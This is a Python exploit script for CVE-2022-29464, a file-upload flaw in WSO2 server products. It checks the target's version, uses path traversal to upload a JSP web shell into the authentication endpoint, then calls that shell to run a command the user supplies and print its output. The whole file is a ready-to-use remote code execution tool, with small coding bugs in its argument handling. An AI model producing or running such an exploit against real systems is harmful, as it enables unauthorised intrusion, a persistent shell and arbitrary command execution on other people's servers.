#!/usr/bin/env python3
import requests
import argparse
import urllib3

# pyright: reportOptionalMemberAccess=false 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global variable for the args
args = None

def parse_args() -> argparse.Namespace:
    """
    Returns the parsed arguments passed in via argparse
    Required arguments are marked by a star (*)

    @return: the parsed args
    """

    # Add some default checks 
    parser = argparse.ArgumentParser(description="CVE-2022-29464 exploit script by cc3305")
    parser.add_argument("URL", action="store", help="Target url")
    parser.add_argument("-f", "--force", action="store_true", help="Force the exploit (skip the check if the host is vulnerable)")
    parser.add_argument("-x", "--proxy", action="store", help="HTTP proxy in the format http://127.0.0.1:8080")
    parser.add_argument("-H", "--headers", action="append", help="Request Headers in the format `\"Header-Name: Header-Value\"`. Multiple -H flags are allowed")
    parser.add_argument("-c", "--cookie", action="append", help="Cookie data in the format `\"COOKIE1=VALUE1; COOKIE2=VALUE2\"`")

    # Add more checks according to exploit, e.g. add a "--command" for a RCE exploit
    parser.add_argument("-C", "--command", action="store", help="Command to run on the target if exploited successfully", required=True)
    
    # Return the parsed args
    result = parser.parse_args()

    # Bring the proxy, cookies and headers into a pythonic format
    result.proxy = {"http": result.proxy, "https": result.proxy}

    headers = {}
    if(result.headers != None):
        for header in result.headers:
            try:
                header_parts = header.split("=")
                headers[header_parts[0]] = header_parts[1]
            except:
                continue
    result.headers = headers

    cookies = {}
    if(result.cookie != None):
        for cookie in result.cookie.split(";"):
            try:
                cookie_parts = cookie.split("=")
                cookies[cookie_parts[0]] = cookie_parts[1]
            except:
                continue
    result.cookie = cookies

    # The program always assumes the url is in the format http://something.com/, not in http://something.com
    if not result.URL.endswith("/"):
        result.URL = f"{args.URL}/"

    return result    

def check_vulnerable():
    """
    Check if the target is vulnerable
    If there is no way to determine if the host is vulnerable just return
    If the host is not vulnerable exit and print a error message, otherwise just return
    """
    # This check is not 100% reliable because this check only works for the wso2am not any other vulnerable product
    fixed_versions = ["4.2.0", "4.1.0", "2.1.0", "1.10.0", "1.9.1", "1.9.0"]
    response = requests.get(f"{args.URL}services/Version", proxies=args.proxy, cookies=args.cookie, headers=args.headers, verify=False)
    if any(f"WSO2 API Manager-{ver}" in response.text for ver in fixed_versions):
        print(f"{args.URL} seems to not be vulnerable. To still run the exploit use -f")
        exit(0)

def run_exploit():
    """
    Where most of the magic happens
    """
    # First construct a shell with the correct command
    jsp_shell = """
<%@ page import="java.io.BufferedReader,java.io.IOException,java.io.InputStreamReader" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<%
try {
    Process process = Runtime.getRuntime().exec("{{cmd}}"); // {{cmd}} is replaced with the actual command
    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

    String line;
    StringBuilder output = new StringBuilder();
    while ((line = reader.readLine()) != null) {
        output.append(line).append("\\n");
    }

    out.print(output.toString());
} catch (IOException e) {
    e.printStackTrace();
}
%>
""".replace("{{cmd}}", args.command)
    # Upload the shell
    files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/cc3305.jsp": jsp_shell}
    response = requests.post(f"{args.URL}fileupload/toolsAny", files=files, timeout=10, proxies=args.proxy, cookies=args.cookie, headers=args.headers, verify=False)
    if response.status_code == requests.codes.ok:
        print(f"Ran command '{args.command}' on {args.URL}")
        # Now make the request to actually get the result of the command
        cmd_out_response = requests.get(f"{args.URL}authenticationendpoint/cc3305.jsp", proxies=args.proxy, cookies=args.cookie, headers=args.headers, verify=False)
        if cmd_out_response.status_code == requests.codes.ok:
            print(cmd_out_response.text.strip())
        else:
            print("Error while getting output")
    else:
        print(f"Something went from while uploading the shell")

if __name__ == "__main__":
    args = parse_args()
    if not args.force:
        check_vulnerable()
    run_exploit()


